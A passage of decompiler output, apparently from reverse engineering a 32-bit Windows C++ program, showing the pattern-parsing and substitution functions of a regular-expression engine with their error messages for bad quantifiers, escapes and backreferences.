                      local_18[0] = local_14 != (int *)0x0;
                      FUN_0040bf91(local_28,local_18);
                    }
                    goto LAB_00405784;
                  }
                  *param_1 = (ushort *)((int)puVar4 + 1);
                  local_14 = FUN_00409bc5('\\',*param_3,(void **)((int)this + 4));
                  local_18[0] = local_14 != (int *)0x0;
                  FUN_0040bf91(local_28,local_18);
                }
                else {
                  *param_1 = (ushort *)((int)puVar4 + 1);
                  local_14 = FUN_00409bc5('\t',*param_3,(void **)((int)this + 4));
                  local_18[0] = local_14 != (int *)0x0;
                  FUN_0040bf91(local_28,local_18);
                }
              }
              else {
                *param_1 = (ushort *)((int)puVar4 + 1);
                local_14 = FUN_00409bc5('\r',*param_3,(void **)((int)this + 4));
                local_18[0] = local_14 != (int *)0x0;
                FUN_0040bf91(local_28,local_18);
              }
            }
            else {
              *param_1 = (ushort *)((int)puVar4 + 1);
              local_14 = FUN_00409bc5('\n',*param_3,(void **)((int)this + 4));
              local_18[0] = local_14 != (int *)0x0;
              FUN_0040bf91(local_28,local_18);
            }
          }
          else {
            *param_1 = (ushort *)((int)puVar4 + 1);
            local_14 = FUN_00409bc5('\f',*param_3,(void **)((int)this + 4));
            local_18[0] = local_14 != (int *)0x0;
            FUN_0040bf91(local_28,local_18);
          }
        }
        else {
          *param_1 = (ushort *)((int)puVar4 + 1);
          local_14 = FUN_00409bc5('\a',*param_3,(void **)((int)this + 4));
          local_18[0] = local_14 != (int *)0x0;
          FUN_0040bf91(local_28,local_18);
        }
      }
      else {
        pbVar3 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  ((int)this + 0x27);
        local_2c = puVar4;
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (pbVar3);
        uVar11 = FUN_004090ff((char **)&local_2c,
                              (char *)(-(uint)(*(int *)(pbVar3 + 4) != 0) &
                                      *(int *)(pbVar3 + 8) + *(int *)(pbVar3 + 4)),999);
        if ((*(char *)*param_1 != '0') && ((uVar11 < 10 || (uVar11 < *(uint *)((int)this + 0xb)))))
        {
          local_14 = FUN_00409c62(uVar11,*param_3,(void **)((int)this + 4));
          local_18[0] = local_14 != (int *)0x0;
          FUN_0040bf91(local_28,local_18);
          FUN_00406ed3(local_18);
          *param_1 = local_2c;
          goto switchD_004051c2_caseD_9;
        }
        param_1 = (ushort **)0x0;
        param_3 = (uint *)0x0;
        do {
          pbVar3 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **
                    )((int)this + 0x27);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                    (pbVar3);
          puVar4 = *ppuVar5;
          bVar13 = (byte)param_1;
          if ((((ushort *)
                (-(uint)(*(int *)(pbVar3 + 4) != 0) & *(int *)(pbVar3 + 8) + *(int *)(pbVar3 + 4))
                == puVar4) || (cVar2 = *(char *)puVar4, cVar2 < '0')) || ('7' < cVar2)) break;
          bVar13 = ((byte)param_1 - 6) * '\b' + cVar2;
          bVar1 = param_3._3_1_ + 1;
          param_3 = (uint *)((uint)bVar1 << 0x18);
          param_1 = (ushort **)(uint)bVar13;
          *ppuVar5 = (ushort *)((int)puVar4 + 1);
        } while ((char)bVar1 < '\x03');
        param_1._0_1_ = bVar13;
        local_14 = FUN_00409bc5((byte)param_1,*puVar6,(void **)((int)this + 4));
        local_18[0] = local_14 != (int *)0x0;
        FUN_0040bf91(local_28,local_18);
      }
      break;
    }
    uVar11 = *param_3;
    *param_1 = (ushort *)((int)puVar4 + -1);
    local_14 = FUN_00409bc5(*(char *)(ushort *)((int)puVar4 + -1),uVar11,(void **)((int)this + 4));
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
LAB_00405784:
    FUN_00406ed3(local_18);
    *param_1 = (ushort *)((int)*param_1 + 1);
  default:
    goto switchD_004051c2_caseD_9;
  case 0x13:
    uVar11 = *param_3;
    ppvVar16 = (void **)((int)this + 4);
    puVar10 = FUN_0040811c();
    local_14 = FUN_00409b0f(puVar10,uVar11,ppvVar16);
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 0x14:
    uVar11 = *param_3;
    ppvVar16 = (void **)((int)this + 4);
    puVar10 = FUN_004081d0();
    local_14 = FUN_00409b0f(puVar10,uVar11,ppvVar16);
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 0x15:
    uVar11 = *param_3;
    ppvVar16 = (void **)((int)this + 4);
    puVar10 = FUN_00408154();
    local_14 = FUN_00409b0f(puVar10,uVar11,ppvVar16);
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 0x16:
    uVar11 = *param_3;
    ppvVar16 = (void **)((int)this + 4);
    puVar10 = FUN_00408208();
    local_14 = FUN_00409b0f(puVar10,uVar11,ppvVar16);
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 0x17:
    uVar11 = *param_3;
    ppvVar16 = (void **)((int)this + 4);
    puVar10 = FUN_004080d8();
    local_14 = FUN_00409b0f(puVar10,uVar11,ppvVar16);
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 0x18:
    uVar11 = *param_3;
    ppvVar16 = (void **)((int)this + 4);
    puVar10 = FUN_0040818c();
    local_14 = FUN_00409b0f(puVar10,uVar11,ppvVar16);
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 0x19:
    local_14 = FUN_00409b68(*param_3,(void **)((int)this + 4));
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 0x1a:
    local_14 = FUN_00409b87(*param_3,(void **)((int)this + 4));
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 0x1b:
    local_14 = FUN_00409ba6(*param_3,(void **)((int)this + 4));
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 0x1c:
    local_14 = FUN_00409a43('\x01',*param_3,(void **)((int)this + 4));
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 0x1d:
    local_14 = FUN_00409a43('\0',*param_3,(void **)((int)this + 4));
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 0x1e:
    local_14 = FUN_00409a9d(*param_3,(void **)((int)this + 4));
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 0x1f:
    local_14 = FUN_00409ad6(*param_3,(void **)((int)this + 4));
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 0x20:
    puVar4 = *param_1;
    local_2c = puVar4;
    while( true ) {
      pbVar3 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)this + 0x27);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (pbVar3);
      if ((ushort *)
          (-(uint)(*(int *)(pbVar3 + 4) != 0) & *(int *)(pbVar3 + 8) + *(int *)(pbVar3 + 4)) ==
          *param_1) break;
      pbVar3 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)this + 0x27);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (pbVar3);
      iVar8 = FUN_00406b23(param_3,(byte **)param_1,
                           (byte *)(-(uint)(*(int *)(pbVar3 + 4) != 0) &
                                   *(int *)(pbVar3 + 8) + *(int *)(pbVar3 + 4)));
      if (iVar8 == 0) {
        pbVar3 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  ((int)this + 0x27);
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (pbVar3);
        if ((ushort *)
            (-(uint)(*(int *)(pbVar3 + 4) != 0) & *(int *)(pbVar3 + 8) + *(int *)(pbVar3 + 4)) !=
            *param_1) {
          *param_1 = (ushort *)((int)*param_1 + 1);
        }
      }
      else if (iVar8 == 0x21) break;
      local_2c = *param_1;
    }
    if (local_2c != puVar4) {
      puVar12 = FUN_0040a5b8((char *)puVar4,(char *)local_2c,*param_3,(void **)((int)this + 4));
      *(undefined4 **)param_2[7] = puVar12;
      param_2[7] = (int)(puVar12 + 1);
    }
    goto LAB_0040534c;
  case 0x21:
    local_78[0] = param_2._3_1_;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (local_78,false);
    sVar7 = strlen(s_quotemeta_turned_off__but_was_ne_0041c2d0);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
              (local_78,s_quotemeta_turned_off__but_was_ne_0041c2d0,sVar7);
    local_8 = CONCAT31(local_8._1_3_,7);
    FUN_00404fa7(local_f4,local_78);
    local_f4[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_f4,(ThrowInfo *)&DAT_004196f8);
  }
  FUN_00406ed3(local_18);
switchD_004051c2_caseD_9:
  if (local_24 != 0) {
    FUN_00408d03(this,local_28,(char **)ppuVar5,(char)local_38,puVar6);
    local_28[0] = '\0';
    *(int *)param_2[7] = local_24;
    param_2[7] = local_24 + 4;
  }
LAB_0040534c:
  local_8 = (uint)local_8._1_3_ << 8;
  FUN_0040c5ed(local_34);
  local_8 = 0xffffffff;
  FUN_00406ed3(local_28);
  ExceptionList = local_10;
  return 1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __thiscall FUN_00405de3(void *this,undefined4 param_1)

{
  undefined4 uVar1;
  undefined4 *puVar2;
  int iVar3;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415b3a;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *(undefined *)((int)this + 4) = 0;
  *(undefined *)((int)this + 5) = 0;
  puVar2 = (undefined4 *)((int)this + 6);
  for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)((int)this + 0x26) = 0;
  puVar2 = (undefined4 *)FUN_00405ee5(param_1);
  uVar1 = *puVar2;
  *(undefined4 *)((int)this + 0x2c) = 0;
  *(undefined4 *)((int)this + 0x28) = uVar1;
  local_8 = 0;
  puVar2 = (undefined4 *)FUN_00405ee5(param_1);
  uVar1 = *puVar2;
  *(undefined4 *)((int)this + 0x34) = 0;
  *(undefined4 *)((int)this + 0x30) = uVar1;
  local_8 = CONCAT31(local_8._1_3_,1);
  puVar2 = (undefined4 *)FUN_00405ee5(param_1);
  *(undefined4 *)((int)this + 0x38) = *puVar2;
  *(undefined4 *)((int)this + 0x3c) = 0;
  *(undefined **)this = &DAT_004177a4;
  ExceptionList = local_10;
  return (undefined4 *)this;
}



void __fastcall FUN_00405e62(undefined4 *param_1)

{
  int iVar1;
  
  *param_1 = &DAT_004177a4;
  iVar1 = param_1[0xf];
  while (iVar1 != 0) {
    iVar1 = *(int *)(param_1[0xf] + 4);
    param_1[0xf] = iVar1;
  }
  iVar1 = param_1[0xd];
  while (iVar1 != 0) {
    iVar1 = *(int *)(param_1[0xd] + 2);
    param_1[0xd] = iVar1;
  }
  iVar1 = param_1[0xb];
  while (iVar1 != 0) {
    iVar1 = *(int *)(param_1[0xb] + 4);
    param_1[0xb] = iVar1;
  }
  return;
}



undefined4 * __thiscall FUN_00405ea1(void *this,byte param_1)

{
  FUN_00405e62((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}



undefined4 __cdecl FUN_00405ee5(undefined4 param_1)

{
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __thiscall FUN_00405eea(void *this,byte **param_1,int param_2,uint *param_3)

{
  byte bVar1;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar2;
  uint uVar3;
  byte **ppbVar4;
  char cVar5;
  undefined3 extraout_var;
  int iVar6;
  byte *pbVar7;
  size_t sVar8;
  undefined4 *puVar9;
  undefined *local_4c [7];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_30 [16];
  char local_20 [4];
  undefined4 *local_1c;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *local_18;
  int local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  ppbVar4 = param_1;
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415b55;
  local_10 = ExceptionList;
  param_1 = (byte **)*param_1;
  pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 0x27);
  ExceptionList = &local_10;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze(pbVar2)
  ;
  local_14 = (int)*ppbVar4 - *(int *)(pbVar2 + 4);
  do {
    if (param_1 != (byte **)*ppbVar4) {
      pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)this + 0x27);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (pbVar2);
      pbVar7 = *ppbVar4;
      iVar6 = *(int *)(pbVar2 + 4);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::erase
                (*(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  ((int)this + 0x27),(char *)pbVar7,(char *)param_1);
      local_18 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  ((int)this + 0x27);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (local_18);
      *ppbVar4 = pbVar7 + (*(int *)(local_18 + 4) - iVar6);
      pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)this + 0x27);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (pbVar2);
      param_1 = (byte **)*ppbVar4;
      if ((byte **)(-(uint)(*(int *)(pbVar2 + 4) != 0) & *(int *)(pbVar2 + 8) + *(int *)(pbVar2 + 4)
                   ) == param_1) break;
    }
    pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 0x27);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (pbVar2);
    cVar5 = FUN_00406b76(param_3,(char **)&param_1,
                         (char *)(-(uint)(*(int *)(pbVar2 + 4) != 0) &
                                 *(int *)(pbVar2 + 8) + *(int *)(pbVar2 + 4)));
    iVar6 = CONCAT31(extraout_var,cVar5);
    if (iVar6 != 0) {
      if (iVar6 == 0xf) {
        pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  ((int)this + 0x27);
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (pbVar2);
        pbVar7 = (byte *)(*(int *)(pbVar2 + 4) + local_14);
        if (pbVar7 != *ppbVar4) goto LAB_0040609b;
      }
      else if ((iVar6 < 0x10) || (0x12 < iVar6)) {
        pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  ((int)this + 0x27);
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (pbVar2);
        pbVar7 = (byte *)(*(int *)(pbVar2 + 4) + local_14);
        if (pbVar7 == *ppbVar4) {
          local_30[0] = param_3._3_1_;
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                    (local_30,false);
          sVar8 = strlen(s_quantifier_not_expected_0041c338);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                    (local_30,s_quantifier_not_expected_0041c338,sVar8);
          local_8 = 0;
          FUN_00404fa7(local_4c,local_30);
          local_4c[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
          _CxxThrowException(local_4c,(ThrowInfo *)&DAT_004196f8);
        }
LAB_0040609b:
        iVar6 = param_2;
        *ppbVar4 = *ppbVar4 + -1;
        if (pbVar7 != *ppbVar4) {
          puVar9 = FUN_0040a5b8((char *)pbVar7,(char *)*ppbVar4,*param_3,(void **)((int)this + 4));
          **(undefined4 **)(iVar6 + 0x1c) = puVar9;
          *(undefined4 **)(iVar6 + 0x1c) = puVar9 + 1;
        }
        uVar3 = *param_3;
        bVar1 = **ppbVar4;
        *ppbVar4 = *ppbVar4 + 1;
        local_1c = FUN_00409bc5(bVar1,uVar3,(void **)((int)this + 4));
        local_20[0] = local_1c != (undefined4 *)0x0;
        local_8 = 1;
        FUN_00408d03(this,local_20,(char **)ppbVar4,'\0',param_3);
        local_20[0] = '\0';
        local_8 = 0xffffffff;
        **(undefined4 **)(iVar6 + 0x1c) = local_1c;
        *(undefined4 **)(iVar6 + 0x1c) = local_1c + 1;
        FUN_00406ed3(local_20);
        ExceptionList = local_10;
        return;
      }
    }
    pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 0x27);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (pbVar2);
    iVar6 = *(int *)(pbVar2 + 4);
    *ppbVar4 = *ppbVar4 + 1;
    if ((byte **)(-(uint)(iVar6 != 0) & *(int *)(pbVar2 + 8) + iVar6) == (byte **)*ppbVar4) break;
    pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 0x27);
    param_1 = (byte **)*ppbVar4;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (pbVar2);
    iVar6 = FUN_00406b23(param_3,(byte **)&param_1,
                         (byte *)(-(uint)(*(int *)(pbVar2 + 4) != 0) &
                                 *(int *)(pbVar2 + 8) + *(int *)(pbVar2 + 4)));
  } while (iVar6 == 0);
  pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 0x27);
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze(pbVar2)
  ;
  puVar9 = FUN_0040a5b8((char *)(local_14 + *(int *)(pbVar2 + 4)),(char *)*ppbVar4,*param_3,
                        (void **)((int)this + 4));
  **(undefined4 **)(param_2 + 0x1c) = puVar9;
  *(undefined4 **)(param_2 + 0x1c) = puVar9 + 1;
  ExceptionList = local_10;
  return;
}



void FUN_00406168(undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined *param_4,
                 void *param_5)

{
  void *this;
  
  this = param_5;
  *param_4 = 1;
  if (param_1[2] != 0) {
    FUN_00407990(param_5,&param_4,*(void ***)((int)param_5 + 4),param_1);
  }
  *param_1 = 1;
  param_1[1] = param_2;
  FUN_00407990(this,&param_4,*(void ***)((int)this + 4),param_1);
  *param_1 = 0;
  param_1[2] = 0;
  param_1[1] = param_3;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __thiscall
FUN_004061be(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1,
            undefined *param_2,void *param_3)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this_00;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar1;
  int iVar2;
  void **ppvVar3;
  size_t sVar4;
  void **ppvVar5;
  undefined *local_98 [7];
  undefined *local_7c [7];
  void *local_60;
  void *local_5c;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_58 [16];
  void *local_48;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_44 [16];
  void *local_34;
  void *local_30;
  void *local_2c;
  void *local_28;
  undefined4 local_24;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *local_20;
  undefined4 local_1c;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *local_18;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  this_00 = param_1;
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415b72;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_28 = this;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
            (param_1);
  param_1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
             (this_00 + 4);
  local_24 = *(undefined4 *)((int)this + 0x13);
  local_1c = 0;
  local_18 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0;
  *param_2 = 0;
LAB_004061fa:
  local_14 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0;
LAB_004061fd:
  do {
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (this_00);
    if ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
        (-(uint)(*(int *)(this_00 + 4) != 0) & *(int *)(this_00 + 8) + *(int *)(this_00 + 4)) ==
        param_1) {
      if (local_14 !=
          (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0) {
        FUN_00407990(param_3,&param_3,*(void ***)((int)param_3 + 4),&local_1c);
      }
      ExceptionList = local_10;
      return;
    }
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (this_00);
    iVar2 = FUN_00406c89((char **)&param_1,
                         (char *)(-(uint)(*(int *)(this_00 + 4) != 0) &
                                 *(int *)(this_00 + 8) + *(int *)(this_00 + 4)));
    if (iVar2 < 0x26) {
      if (iVar2 == 0x25) {
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (this_00);
        iVar2 = (int)param_1 - *(int *)(this_00 + 4);
        *param_2 = 1;
        if (local_14 !=
            (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0) {
          FUN_00406aeb(param_3,&local_1c);
        }
        local_18 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                   0x0;
        goto LAB_0040636b;
      }
      if (iVar2 == 0x22) {
        iVar2 = *(int *)((int)local_28 + 0xf);
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (this_00);
        local_20 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                   FUN_004090ff((char **)&param_1,
                                (char *)(-(uint)(*(int *)(this_00 + 4) != 0) &
                                        *(int *)(this_00 + 8) + *(int *)(this_00 + 4)),iVar2 - 1);
        if (local_20 ==
            (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0) {
          local_44[0] = param_3._3_1_;
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                    (local_44,false);
          sVar4 = strlen(s_invalid_backreference_in_substit_0041c384);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                    (local_44,s_invalid_backreference_in_substit_0041c384,sVar4);
          local_8 = 0;
          FUN_00404fa7(local_7c,local_44);
          local_7c[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
          _CxxThrowException(local_7c,(ThrowInfo *)&DAT_004196f8);
        }
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (this_00);
        iVar2 = (int)param_1 - *(int *)(this_00 + 4);
        *param_2 = 1;
        if (local_14 !=
            (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0) {
          FUN_00406aeb(param_3,&local_1c);
        }
        local_18 = local_20;
        goto LAB_0040636b;
      }
      if (iVar2 == 0x23) {
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (this_00);
        iVar2 = (int)param_1 - *(int *)(this_00 + 4);
        *param_2 = 1;
        if (local_14 !=
            (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0) {
          FUN_00406aeb(param_3,&local_1c);
        }
        local_18 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                   0xffffffff;
        goto LAB_0040636b;
      }
      if (iVar2 == 0x24) break;
    }
    else {
      if (iVar2 == 0x26) {
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (this_00);
        if ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
            (-(uint)(*(int *)(this_00 + 4) != 0) & *(int *)(this_00 + 8) + *(int *)(this_00 + 4)) ==
            param_1) {
          local_58[0] = param_3._3_1_;
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                    (local_58,false);
          sVar4 = strlen(s_expecting_escape_sequence_in_sub_0041c350);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                    (local_58,s_expecting_escape_sequence_in_sub_0041c350,sVar4);
          local_8 = 1;
          FUN_00404fa7(local_98,local_58);
          local_98[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
          _CxxThrowException(local_98,(ThrowInfo *)&DAT_004196f8);
        }
        if (local_14 !=
            (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0) {
          FUN_00407990(param_3,&local_60,*(void ***)((int)param_3 + 4),&local_1c);
        }
        pbVar1 = param_1;
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (this_00);
        param_1 = param_1 + 1;
        local_18 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                   ((int)pbVar1 - *(int *)(this_00 + 4));
        local_14 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                   0x1;
        goto LAB_004061fd;
      }
      if (iVar2 == 0x27) {
        if (local_14 !=
            (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0) {
          FUN_00407990(param_3,&local_34,*(void ***)((int)param_3 + 4),&local_1c);
        }
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (this_00);
        local_18 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                   ((int)param_1 - *(int *)(this_00 + 4));
        iVar2 = 0x27;
        goto LAB_0040641e;
      }
      if ((0x27 < iVar2) && (iVar2 < 0x2d)) {
        if (local_14 !=
            (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0) {
          FUN_00407990(param_3,&local_5c,*(void ***)((int)param_3 + 4),&local_1c);
        }
        ppvVar5 = *(void ***)((int)param_3 + 4);
        ppvVar3 = &local_30;
        local_18 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                   iVar2;
        goto LAB_004063c8;
      }
    }
    local_14 = local_14 + 1;
    param_1 = param_1 + 1;
  } while( true );
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
            (this_00);
  iVar2 = (int)param_1 - *(int *)(this_00 + 4);
  *param_2 = 1;
  if (local_14 !=
      (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0) {
    FUN_00406aeb(param_3,&local_1c);
  }
  local_18 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
             0xfffffffe;
LAB_0040636b:
  local_1c = 1;
  FUN_00406aeb(param_3,&local_1c);
  local_1c = 0;
  local_18 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)iVar2;
  goto LAB_004061fa;
  while (iVar2 != 0x2c) {
LAB_0040641e:
    local_20 = param_1;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (this_00);
    if ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
        (-(uint)(*(int *)(this_00 + 4) != 0) & *(int *)(this_00 + 8) + *(int *)(this_00 + 4)) ==
        param_1) break;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (this_00);
    iVar2 = FUN_00406c89((char **)&param_1,
                         (char *)(-(uint)(*(int *)(this_00 + 4) != 0) &
                                 *(int *)(this_00 + 8) + *(int *)(this_00 + 4)));
    if (iVar2 == 0) {
      param_1 = param_1 + 1;
      goto LAB_0040641e;
    }
  }
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
            (this_00);
  local_14 = local_20 + (-*(int *)(this_00 + 4) - (int)local_18);
  if (local_14 !=
      (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0) {
    FUN_00407990(param_3,&local_2c,*(void ***)((int)param_3 + 4),&local_1c);
  }
  if (iVar2 == 0x2c) {
    local_18 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x2c;
    ppvVar5 = *(void ***)((int)param_3 + 4);
    ppvVar3 = &local_48;
LAB_004063c8:
    local_1c = 2;
    FUN_00407990(param_3,ppvVar3,ppvVar5,&local_1c);
  }
  local_1c = 0;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
            (this_00);
  local_18 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
             ((int)param_1 - *(int *)(this_00 + 4));
  goto LAB_004061fa;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __thiscall FUN_004065f1(void *this,uint param_1)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar1;
  undefined4 uVar2;
  byte bVar3;
  char cVar4;
  int *this_00;
  undefined4 *puVar5;
  int iVar6;
  int iVar7;
  undefined3 extraout_var;
  undefined local_38 [4];
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 *local_24;
  void *local_20;
  ushort *local_1c;
  uint local_18;
  byte *local_14;
